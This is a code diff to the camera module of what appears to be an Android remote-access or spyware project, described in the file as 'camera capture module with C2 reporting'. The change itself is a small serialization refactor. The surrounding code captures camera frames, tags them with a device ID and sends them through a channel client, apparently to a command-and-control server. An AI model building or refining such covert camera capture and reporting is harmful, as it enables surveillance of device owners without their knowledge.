@@ -1,6 +1,3 @@
-// ============================================================
-// FILE: android/app/src/main/java/com/xrc/sensors/Camera.kt
-// ============================================================
 package com.xrc.sensors
 
 import android.Manifest
@@ -9,6 +6,7 @@ import com.xrc.comms.ChannelClient
 import com.xrc.comms.Message
 import com.xrc.comms.Protocol
 import com.xrc.core.crypto.Identity
+import com.xrc.core.toJsonString
 
 /**
  * Camera — camera capture module with C2 reporting.
@@ -28,9 +26,7 @@ class Camera(
                 type = Protocol.TYPE_SENSOR_DATA,
                 id = "cam_${System.currentTimeMillis()}",
                 device_id = deviceId,
-                payload = Protocol.json.encodeToString(
-                    mapOf("type" to "camera_frame", "data" to frame)
-                )
+                payload = mapOf("type" to "camera_frame", "data" to frame).toJsonString()
             )
             channelClient.send(msg)
             onFrame(frame)
